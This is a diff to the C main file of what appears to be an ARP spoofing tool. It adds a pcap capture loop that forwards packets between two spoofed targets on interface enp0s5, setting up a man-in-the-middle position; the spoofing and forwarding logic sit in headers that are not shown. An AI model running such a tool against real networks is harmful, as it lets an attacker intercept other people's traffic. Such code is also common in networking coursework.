@@ -1,9 +1,14 @@
 #include <stdio.h>
 #include <sys/types.h> // for u_char
 #include <arpa/inet.h> // for htons, inet_addr
+#include <pcap/pcap.h> // for pcap_loop
+#include <string.h> // for memcpy
 #include "find_target_ethernet_address.h"
 #include "find_ethernet_address.h"
 #include "arp_spoofing.h"
+#include "pcap_init.h"
+#include "packet_forward.h"
+#include "header.h"
 
 int main(int argc, char**argv) {
 
@@ -27,5 +32,14 @@ int main(int argc, char**argv) {
 
 	send_arp_spoofing("enp0s5", target1_ethernet_address, (u_char*)&target1_ip_address, target2_ethernet_address, (u_char*)&target2_ip_address);
 
+	u_char callback_args[sizeof(struct spoofing_attack)];
+	struct spoofing_attack *spoofing_attack = (struct spoofing_attack*) callback_args;
+	memcpy(spoofing_attack->target1_ethernet_address, target1_ethernet_address, ETH_ALEN);
+	memcpy(spoofing_attack->target2_ethernet_address, target2_ethernet_address, ETH_ALEN);
+	memcpy(spoofing_attack->interface_name, "enp0s5", sizeof("enp0s5"));
+
+	pcap_t *handle = init_pcap("enp0s5");
+	pcap_loop(handle, 1000, forward, callback_args);
+	
 	return 0;
 }
